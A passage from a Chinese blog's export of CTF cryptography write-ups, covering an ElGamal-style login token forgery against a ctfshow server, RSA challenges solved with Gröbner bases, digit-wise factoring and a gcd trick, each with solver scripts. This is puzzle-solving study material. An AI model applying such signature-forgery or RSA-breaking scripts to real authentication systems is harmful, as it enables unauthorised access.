class="built_in">str</span>(i).encode()).decode()</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>注意与上次那道题不同，这个pad是用库函数的，很奇怪，明明给了32位的，会给你填成48位的，但问题不大</p>
<p>flag就不贴了</p>
<h2 id="ctfshow-login（recuring）"><a href="#ctfshow-login（recuring）" class="headerlink" title="ctfshow_login（recuring）"></a>ctfshow_login（recuring）</h2><p>最关键的代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify_token</span>(<span class="params">username, r, s, y</span>):</span></span><br><span class="line">    u = bytes_to_long(username) &amp; MASK</span><br><span class="line">    <span class="comment"># No cheating</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>([x &lt;= <span class="number">0</span> <span class="keyword">or</span> x &gt;= p - <span class="number">1</span> <span class="keyword">for</span> x <span class="keyword">in</span> (u, r, s)]):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(g, u, p) == (<span class="built_in">pow</span>(y, r, p) * <span class="built_in">pow</span>(r, s, p)) % p</span><br></pre></td></tr></table></figure>

<p>也就是要满足<br>$$<br>g^u\equiv_py^r\cdot r^s<br>$$<br>其中已知，</p>
<p>$p$<br>$g=7$<br>$y=g^x\ (mod\ p)$</p>
<p>u由我们指定，至少包含一个题目中提供的花名，r和s产生自以下函数，也就是题目提示丢失的私钥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_token</span>(<span class="params">username, x</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        u = bytes_to_long(username) &amp; MASK</span><br><span class="line">        k = randint(<span class="number">2</span>, p - <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> GCD(k, p - <span class="number">1</span>) != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        r = <span class="built_in">pow</span>(g, k, p)</span><br><span class="line">        s = (u - x * r) * inverse(k, p - <span class="number">1</span>) % (p - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> s == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">return</span> (r, s)</span><br></pre></td></tr></table></figure>

<p>$r=g^k\ (mod\ p)\<br>s=(u-x\cdot r)\cdot k^{-1}\ mod\ (p-1)$</p>
<p>确实，代入验证的式子就可知，如果知道正确的x生成的(r, s)，是可以使等式两边成立的；该加密系统也是基于DLP</p>
<p>fw不费，看着春哥的知乎开始复现</p>
<hr>
<p>想不到啊，没这方面的经验，要让$g^u\equiv_py^r\cdot r^s$成立，r和s都是由我们指定的，春哥师傅让$r=g^iy^j$，这样代入上式，得<br>$$<br>g^u\equiv_py^{g^iy^j}g^{si}y^{sj}<br>$$<br>显然根据欧拉定理，或者加上费马小定理，如果<br>$$<br>u\equiv_{p-1}si\<br>$$<br>那么只要满足<br>$$<br>1\equiv_{p}y^ry^{sj}<br>$$<br>就好了，但是师傅的推导我没有看明白，他说如果满足<br>$$<br>y\equiv_{p-1}sj<br>$$<br>上式就成立了，没转过弯来，太fw了；之后就可以通过计算随机数i和j，算出r和s还有u，就可以拿去伪造了</p>
<p>还有一个忘说了，u必须包含一个花名</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_login</span>(<span class="params">username</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>([mem <span class="keyword">in</span> username <span class="keyword">for</span> mem <span class="keyword">in</span> CTFSHOW_MEMBERS])</span><br></pre></td></tr></table></figure>

<p>就选<code>ZM.J@CTFshow</code>吧，放在前面，后1024就是我们真正的u吧</p>
<p>还好还有第二种思路，好强啊，二次剩余，欧拉准则，直接把你搞成1</p>
<p>前景知识可以参考<a href="https://blog.csdn.net/m0_49109277/article/details/120082896?spm=1001.2014.3001.5501">rabin攻击</a></p>
<p>回到$g^u\equiv_py^rg^s$，我一开始也想，也是比较自然的想法，每个变量之间有这样或那样的联系，看不透，既然要同余式两边相同，那直接干脆暴力全部都变1好了；比赛中也就是这么想想，并没有实现的思路</p>
<p>但春哥想到了二次剩余，也就是</p>
<ul>
<li>如果a是p的二次剩余，那么$(\frac{a}{p})=1$</li>
<li>如果a不是p的二次剩余，那么$(\frac{a}{p})=-1$</li>
</ul>
<p>当然在此之前的想法一般是让u的低1024位和r还有s等于p-1，由费马小定理易解，哒咔</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">any</span>([x &lt;= <span class="number">0</span> <span class="keyword">or</span> x &gt;= p - <span class="number">1</span> <span class="keyword">for</span> x <span class="keyword">in</span> (u, r, s)]):</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>有范围限制，最大也就是p-2；所以进而想到的二次剩余</p>
<p>根据欧拉准则<br>$$<br>a^\frac{p-1}{2}\equiv_p(\frac{a}{p})<br>$$<br>$a^{p-1}\ mod\ p$太大了不行，那么我们求个二次剩余，显然也就是让$u=r=s=\frac{p-1}{2}$，结果就只能是1或则-1，emmmmm然后还是要碰下运气，非预期？</p>
<p>最后注意下输入输出吧，没注意，r和s一直send十六进制编码，我说怎么出不了，还有注意u已经是字节了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">username = <span class="built_in">input</span>(<span class="string">&#x27;username (in hex): &#x27;</span>)</span><br><span class="line">username = <span class="built_in">bytes</span>.fromhex(username)</span><br><span class="line">r = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;r (in hex): &#x27;</span>), <span class="number">16</span>)</span><br><span class="line">s = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;s (in hex): &#x27;</span>), <span class="number">16</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    u = bytes_to_long(<span class="string">b&#x27;ZM.J@CTFshow&#x27;</span>) &lt;&lt; <span class="number">1024</span></span><br><span class="line">    sh = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28066</span>)</span><br><span class="line">    content = sh.recvuntil(<span class="string">b&#x27;username (in hex):&#x27;</span>).decode()</span><br><span class="line">    p, y = findall(<span class="string">r&quot;\d+&quot;</span>, content)</span><br><span class="line">    p, y = <span class="built_in">int</span>(p), <span class="built_in">int</span>(y)</span><br><span class="line">    u, r, s = long_to_bytes(u + (p - <span class="number">1</span>) // <span class="number">2</span>), (p - <span class="number">1</span>) // <span class="number">2</span>, (p - <span class="number">1</span>) // <span class="number">2</span></span><br><span class="line">    sh.sendline(u.<span class="built_in">hex</span>())</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;r (in hex):&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">hex</span>(r))</span><br><span class="line">    sh.recvuntil(<span class="string">b&#x27;s (in hex):&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">hex</span>(s))</span><br><span class="line">    flag = sh.recvline()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;ctfshow&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="张八炫CTFshow三结义（recuring）"><a href="#张八炫CTFshow三结义（recuring）" class="headerlink" title="张八炫CTFshow三结义（recuring）"></a>张八炫CTFshow三结义（recuring）</h2><p>emmmmm代码这么短，比赛时没来得及看，不要问为什么，烦</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> zang, ba88, xuan, p, q, e</span><br><span class="line"></span><br><span class="line"><span class="comment"># F91 is my wife forever</span></span><br><span class="line"><span class="keyword">assert</span> isPrime(e) <span class="keyword">and</span> (e &lt; <span class="number">91</span>)</span><br><span class="line"></span><br><span class="line">N = p*q</span><br><span class="line">ps = <span class="built_in">list</span>(<span class="built_in">map</span>(bytes_to_long, (zang, ba88, xuan)))</span><br><span class="line">cs = [<span class="built_in">pow</span>(i,e,N) <span class="keyword">for</span> i <span class="keyword">in</span> ps]</span><br><span class="line">s = <span class="built_in">sum</span>(ps) <span class="comment"># UNITE</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;N = <span class="subst">&#123;N&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;cs = <span class="subst">&#123;cs&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;s = <span class="subst">&#123;s&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>知道所有的明文之和，知道所有的密文，但不知道哪个是flag；素指数e比较小，但N和c相同位数小指数攻击估计也够呛；N不知道是由什么样的p和q生成的，估计也不好分解</p>
<p>看下hint</p>
<blockquote>
<p>此题可能需要一定的算力以及耐心。</p>
</blockquote>
<blockquote>
<p>如果你觉得当前容器所给出的问题太难解出，不妨重开一个容器。</p>
</blockquote>
<p>那我觉得太难可以换道题吗（doge），如果我开了100个容器还是不会怎么办（bushi）</p>
<p>没看wp前我的思路是，就手头上有的，很容易可以想到<br>$$<br>(m_1+m_2+m_3)^e\ mod\ n<br>$$<br>关于多项式的展开如下<br>$$<br>(a_1+a_2+\cdots+a_m)^n=\sum\frac{n!}{x_1!x_2!\cdots x_m!}a_1^{x_1}a_1^{x_2}\cdots a_m^{x_m}<br>$$<br>其中$x_1+x_2+\cdots+x_m=n$，也就是所有可能加起来等于n的组合</p>
<p>哦对不起，这是求和的</p>
<p>满足条件的e有18个</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e = [<span class="number">17</span>,<span class="number">19</span>,<span class="number">23</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">37</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">59</span>,<span class="number">61</span>,<span class="number">67</span>,<span class="number">71</span>,<span class="number">73</span>,<span class="number">79</span>,<span class="number">83</span>,<span class="number">89</span>]</span><br></pre></td></tr></table></figure>

<p>不会了，直接看wp</p>
<p>emmmmm Gröbner基</p>
<p>la佬~</p>
<p>我又来逛la佬博客了</p>
<p>格罗布纳基，又是哪位天才的神作</p>
<hr>
<h3 id="Grobner基"><a href="#Grobner基" class="headerlink" title="Gröbner基"></a>Gröbner基</h3><h4 id="理想"><a href="#理想" class="headerlink" title="理想"></a>理想</h4><p><del>首先我们来谈谈理想，我的理想是要成为秧歌star</del></p>
<p>对于一个多项式集合$F=f_1,\cdots,f_k$，其生成的<strong>理想</strong>为集合元素的线性组合，la佬的latex在我这里显示有点问题，应该是这样<br>$$<br>\langle f_1,\cdots,f_k \rangle=\bigg({ \sum\limits_{i=1}^k g_if_i \vert g_1,\cdots,g_k \in K[x_1,\cdots,x_n] \bigg)}<br>$$<br>其中$R=K[x_1,\cdots,x_n]$是在域$K$上的多项式环，g是多项式环中的一个多项式，x是多项式g的系数，是属于有限域$K$上的，也就是说f的系数是多项式，而由f组成的线性组合就是理想</p>
<p>什么是多项式环，我先理解成系数在$[0,\ R]$上的多项式集合吧，那域$K$就是$Z_K^*$（反正也不懂，xjb理解一下，有清楚的师傅评论区教教我，阻止我进一步误导别人）</p>
<ul>
<li>$x_i$是数</li>
<li>$g_i$是系数为$x_i$的多项式</li>
<li>$f_i$是系数为多项式$g_i$的多项式？</li>
</ul>
<h4 id="Grobner基-1"><a href="#Grobner基-1" class="headerlink" title="Gröbner基"></a>Gröbner基</h4><p>Gröbner基就是单项式序下的多项式环$K[x_1,\cdots,x_n]$，其理想$I$满足一定条件的有限生成集$G=g_1,g_2,_\cdots,g_t$吧</p>
<img data-src="https://pica.zhimg.com/50/v2-4c36be6e98c5aeccecbe8fca58dba6dc_720w.jpg?source=1940ef5c" alt="程序员有哪些专用的聊天表情包啊……？ - 知乎"/>

<hr>
<p>算了看不懂，又浪费30分钟，直接用吧</p>
<p>已知理想求Gröbner基</p>
<p>定义三元多项式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">P.&lt;x, y, z&gt; = PolynomialRing(Zmod(N))</span><br></pre></td></tr></table></figure>

<p>构造理想</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">G = [x+y+z-s, x^e-cs[<span class="number">0</span>], y^e-cs[<span class="number">1</span>], z^e-cs[<span class="number">2</span>]]</span><br></pre></td></tr></table></figure>

<p>然后用sage现成的函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">B = Ideal(G).groebner_basis()</span><br></pre></td></tr></table></figure>

<p>今天才知道tqdm只是个进度条而已，好看点吧。。。确实好看，好用，用法和for一样</p>
<p>问题是这个理想是怎么构造的，问了下老师，我自己的理解吧；<strong>首先有三个要求的密文，于是就设置在有限域$\mathbb{Z}^*_n$的三元变量，由已知条件，显然可以构造4个多项式值为0的多项式，他们组成了理想，用这个理想可以求出一个Gröbner基，Gröbner基就是这个理想属于的最短的那个基，如果不是满足这个基的理想是求不出来的</strong></p>
<p>求出来的Gröbner基是一元的，也就是$x+x_0,\ y+y_0,\ z+z_0$，他们都等于N</p>
<hr>
<p>唔，苦露西，代码再短也不会</p>
<p>直接跑脚本了，确实慢，到了一半我就掐掉重开，终于成功，得到</p>
<blockquote>
<p>[x +<br>26662827782051464615976567684752925677467881725332575738209359733512862160799560732998203503511148730687717124305275025073641447585135831097416975699029611753775395118044337114687461451203396381780284280332279054412946883024040851932234340654069479840307590336431065451668520879110676315718029797292361072793366910857300705975725867933068706498317130739553540485217415514125547447045647449411275827867898811663393269578679727735421639780469843184306978152618597198612892115614024042436618084049774644761224850091459122581613735095060947960942929699069451075614514322230810345965639861985343385928596524291866515457506,<br>y +<br>26662827782051464615976567684752925677467881725332575738209359733512862160799560732998203503511148730687717124305275025073641447585135831097416975699029611753775395118044337114687461451203396381780284280332279054412946883024040851932234340654069479840307590336431065451668520879110676315718029797292361072793366910857300705975725867933068706498317130739553540485217415514125547447045647449411275827867898811663393269578679727735421639780469843184306978152618597198612892115614024042436618084049774644761224850091459122581613735095060947960942929699069451075614514322230810345965639868618012628867112994837267731290388,<br>z +<br> 26662827782051464615976567684752925677467881725332575738209359733512862160799560732998203503511148730687717124305275025073641447585135831097416975699029611753775395118044337114687461451203396381780284280332279054412946883024040851932234340654069479840307590336431065451668520879110676315718029797292361072793366910857300705975725867933068706498317130739553540485217415514125547447045647449411275827867898811663393269578679727735421639780469843184306978152618597198612892115614024042436618084049774644761224850091459122581613735095060947960942929699069451075614514322230810345965509879226494955760912958428560544399675]</p>
</blockquote>
<p>然后N减去后面这个数字，转字节懂的</p>
<p>所以感觉Gröbner基可解多元方程，但又不完全是</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>Gröbner基</tag>
      </tags>
  </entry>
  <entry>
    <title>20210925 长安杯Crypto方向部分复现</title>
    <url>/posts/1f50d7b8/</url>
    <content><![CDATA[<p>又是零解的一天，凭借强悍的队友，全程只靠web晋级</p>
<p>但还是太菜了，密码全程做下来很麻，series和ticket_login零解，easyRSA十一解；比赛中看的两道都感觉做过，series和<a href="https://blog.csdn.net/m0_49109277/article/details/117441546?spm=1001.2014.3001.5501">斐波那契数列</a>那题很像，已知少了点；easyRSA就完全是原题了，就是<a href="https://blog.csdn.net/m0_49109277/article/details/120402275?spm=1001.2014.3001.5501">海洋大学校赛</a>的那道题差不多类似，只是二进制改成十进制了，这次吃了只抄脚本的亏了。好在尚师傅比赛结束就用第五空间的脚本改出来了，能让我对这种类型的题目加以理解</p>
<span id="more"></span>

<h2 id="长安杯"><a href="#长安杯" class="headerlink" title="长安杯"></a>长安杯</h2><h2 id="easyRSA"><a href="#easyRSA" class="headerlink" title="easyRSA"></a>easyRSA</h2><p>第三次遇到了，但网上对这种类型题目的介绍少之甚少，也可能是我没搜到；但对于大师傅而言这都是很基础很基础的了，懒得写脚本的那种</p>
<p>（这不就有了吗，<a href="https://math.stackexchange.com/questions/2087588/integer-factorization-with-additional-knowledge-of-p-oplus-q">来自官方WP</a>，四年前的）</p>
<hr>
<p>对于读懂代码环节，下面两句话是关键，也是尚师傅看出来的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ans = ans*<span class="number">10</span>+(a0[i+<span class="built_in">len</span>(a0)-<span class="built_in">len</span>(b0)]+b0[i]+<span class="number">4</span>)%<span class="number">10</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ans = ans*<span class="number">10</span>+((a0[i+<span class="built_in">len</span>(a0)-<span class="built_in">len</span>(b0)]+<span class="number">2</span>)*(b0[i]+<span class="number">2</span>))%<span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>里面的数字不是随便添加的，而是由于前面转了字节，所以这里a0和b0是ascii码；上面实现的是没有进位也就是类似有限域是10的十进制加法和乘法</p>
<p>知道加和乘之后的结果，让我们求p和q</p>
<p>虽然每一步都知道怎么推，但是堆叠多了，脑子转不过来；针对这道题有一种写法，感觉非常的巧妙</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pq0 = [(<span class="number">0</span>, <span class="number">0</span>)]</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    pq, pq0 = pq0, [(<span class="number">0</span>, <span class="number">0</span>)]</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>每次给pq0清空去装符合条件的新值，并用pq去存上一次的值，通过遍历pq选择符合条件的装入pq0</p>
<p>确实讲不得清楚，自己也还没完全搞懂，先贴个脚本，再遇到用这个结构试试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">100457237809578238448997689590363740025639066957321554834356116114019566855447194466985968666777662995007348443263561295712530012665535942780881309520544097928921920784417859632308854225762469971326925931642031846400402355926637518199130760304347996335637140724757568332604740023000379088112644537238901495181</span></span><br><span class="line">c = <span class="number">49042009464540753864186870038605696433949255281829439530955555557471951265762643642510403828448619593655860548966001304965902133517879714352191832895783859451396658166132732818620715968231113019681486494621363269268257297512939412717227009564539512793374347236183475339558666141579267673676878540943373877937</span></span><br><span class="line">ad = <span class="string">b&#x27;0399034381787849923326924881454040531711492204619924608227265350044149907274051734345037676383421545973249148286183660679683016947030357640361405556516408&#x27;</span></span><br><span class="line">mu = <span class="string">b&#x27;6004903250672248020273453078045186428048881010508070095760634049430058892705564009054400328070528434060550830050010084328522605000400260581038846465000861&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">xx, yy</span>):</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> xi <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> yi <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">            <span class="keyword">if</span> (xi + yi) % <span class="number">10</span> == xx <span class="keyword">and</span> (xi * yi) % <span class="number">10</span> == yy:</span><br><span class="line">                res.append((xi, yi))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">t, p0, q0</span>):</span></span><br><span class="line">    <span class="keyword">if</span> p0 * q0 % <span class="number">10</span> ** (t + <span class="number">1</span>) == n % (<span class="number">10</span> ** (t + <span class="number">1</span>)):</span><br><span class="line">        pq0.append((p0, q0))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pq0 = [(<span class="number">0</span>, <span class="number">0</span>)]</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mu)):</span><br><span class="line">    pq, pq0 = pq0, [(<span class="number">0</span>, <span class="number">0</span>)]</span><br><span class="line">    x = ad[-k - <span class="number">1</span>] - <span class="number">48</span></span><br><span class="line">    y = mu[-k - <span class="number">1</span>] - <span class="number">48</span></span><br><span class="line">    <span class="keyword">for</span> ans <span class="keyword">in</span> solve(x, y):</span><br><span class="line">        <span class="keyword">for</span> (i, j) <span class="keyword">in</span> pq:</span><br><span class="line">            i = (i + ans[<span class="number">0</span>] * <span class="number">10</span> ** k)</span><br><span class="line">            j = (j + ans[<span class="number">1</span>] * <span class="number">10</span> ** k)</span><br><span class="line">            add(k, i, j)</span><br><span class="line">p = pq0[-<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line"><span class="keyword">assert</span> n % p == <span class="number">0</span></span><br><span class="line">q = n // p</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)), n)))</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>RSA p^q</tag>
      </tags>
  </entry>
  <entry>
    <title>20210929 绿城杯Crypto方向WP</title>
    <url>/posts/85864d0a/</url>
    <content><![CDATA[<p>听名字就不咋滴</p>
<p>怎么像个房地产的名字</p>
<span id="more"></span>

<h1 id="绿城杯"><a href="#绿城杯" class="headerlink" title="绿城杯"></a>绿城杯</h1><h2 id="Crypto-warmup加密算法"><a href="#Crypto-warmup加密算法" class="headerlink" title="Crypto-warmup加密算法"></a>Crypto-warmup加密算法</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">str1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">cipher_text, a, b, m</span>):</span></span><br><span class="line">    d = gmpy2.invert(a, m)</span><br><span class="line">    plain_text = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cipher_text:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> str1:</span><br><span class="line">            addr = str1.find(i)</span><br><span class="line">            plain_text += str1[d * (addr - b) % m]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            plain_text += i</span><br><span class="line">    <span class="built_in">print</span>(plain_text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cipher = <span class="string">&#x27;aoxL&#123;XaaHKP_tHgwpc_hN_ToXnnht&#125;&#x27;</span></span><br><span class="line">decode(cipher, <span class="number">37</span>, <span class="number">23</span>, <span class="number">52</span>)</span><br></pre></td></tr></table></figure>

<h2 id="Crypto-RSA-1"><a href="#Crypto-RSA-1" class="headerlink" title="Crypto-RSA-1"></a>Crypto-RSA-1</h2><p>尚师傅拿了二血</p>
<p>这个性质是真的好用（仅限CTF？），如果$n=pq$，且$(p,\ q)=1$<br>$$<br>c\equiv m^e\ mod\ n\Leftrightarrow c\equiv m^e\ mod\ p,\ c\equiv m^e\ mod\ q<br>$$</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">17365231154926348364478276872558492775911760603002394353723603461898405740234715001820111548600914907617003806652492391686710256274156677887101997175692277729648456087534987616743724646598234466094779540729413583826355145277980479040157075453694250572316638348121571218759769533738721506811175866990851972838466307594226293836934116659685215775643285465895317755892754473332034234495795936183610569571016400535362762699517686781602302045048532131426035260878979892169441059467623523060569285570577199236309888155833013721997933960457784653262076135561769838704166810384309655788983073376941843467117256002645962737847</span></span><br><span class="line">c = <span class="number">6944967108815437735428941286784119403138319713455732155925055928646536962597672941805831312130689338014913452081296400272862710447207265099750401657828165836013122848656839100854719965188680097375491193249127725599660383746827031803066026497989298856420216250206035068180963797454792151191071433645946245914916732637007117085199442894495667455544517483404006536607121480678688000420422281380539368519807162175099763891988648117937777951069899975260190018995834904541447562718307433906592021226666885638877020304005614450763081337082838608414756162253825697420493509914578546951634127502393647068722995363753321912676</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">p = gcd(n, c)</span><br><span class="line">q = n // p</span><br><span class="line"><span class="keyword">assert</span> n == p * q</span><br><span class="line">padding = <span class="number">2021</span> * <span class="number">1001</span> * p</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)), n) // padding))</span><br></pre></td></tr></table></figure>

<h2 id="Crypto-RSA2-PLUS"><a href="#Crypto-RSA2-PLUS" class="headerlink" title="Crypto-RSA2-PLUS"></a>Crypto-RSA2-PLUS</h2><p>好吧，一天看了三道简单题，赛方没有密码师傅啊</p>
<p>第二层解个方程就好，第一层主要用到费马分解，分解出来可能是$pq$和$p_1q_1$，或$pq_1$或者$p_1q$，然后设下未知数爆破解方程就好</p>
<p>可以试试，512位的相邻素数之间一般一个差3位数</p>
<p>脚本可以写得更好点，但是对于这题没必要，<em>她值得更好</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert, iroot</span><br><span class="line"><span class="keyword">from</span> public <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># level1</span></span><br><span class="line"><span class="comment"># yafu</span></span><br><span class="line">pq1 = <span class="number">79679231796035037354449627487236220201878797729093909877127396750043503300636464774059752126148617367251988043645511172901030621825575172979048675217345099706517900079260617448298874437193769061144201311929792287772928471712053565834702260975126852624433945451405258351557569670978748727663718174543709899747</span></span><br><span class="line"></span><br><span class="line">p1q = n1 // pq1</span><br><span class="line">z = <span class="built_in">abs</span>(pq1 - p1q)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_force_pq</span>():</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">1000</span>, <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">1000</span>, <span class="number">2</span>):</span><br><span class="line">            delta = (x * y + z) ** <span class="number">2</span> + <span class="number">4</span> * x * y * p1q</span><br><span class="line">            <span class="keyword">if</span> delta &gt; <span class="number">0</span> <span class="keyword">and</span> iroot(delta, <span class="number">2</span>)[<span class="number">1</span>]:</span><br><span class="line">                p = ((-z - x * y) + iroot(delta, <span class="number">2</span>)[<span class="number">0</span>]) // (<span class="number">2</span> * x)</span><br><span class="line">                <span class="keyword">if</span> isPrime(p):</span><br><span class="line">                    q1 = p1q // p</span><br><span class="line">                    p1, q = nextprime(p), prevprime(q1)</span><br><span class="line">                    phi = (p1 - <span class="number">1</span>) * (q1 - <span class="number">1</span>) * (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">return</span> phi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># level2</span></span><br><span class="line">a = symbols(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">b = symbols(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">ans = solve([a * b - p2q2,  a + b - p2_q2], [a, b])[<span class="number">0</span>]</span><br><span class="line">p2, q2 = ans</span><br><span class="line"><span class="keyword">if</span> n2 != p2 ** <span class="number">2</span> * q2 ** <span class="number">3</span>:</span><br><span class="line">    p2, q2 = q2, p2</span><br><span class="line"><span class="keyword">assert</span> n2 == p2 ** <span class="number">2</span> * q2 ** <span class="number">3</span></span><br><span class="line">phi1 = brute_force_pq()</span><br><span class="line">phi2 = <span class="built_in">int</span>((p2 - <span class="number">1</span>) * p2 * (q2 - <span class="number">1</span>) * q2 ** <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c1, invert(e, phi1), n1)).decode(), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span 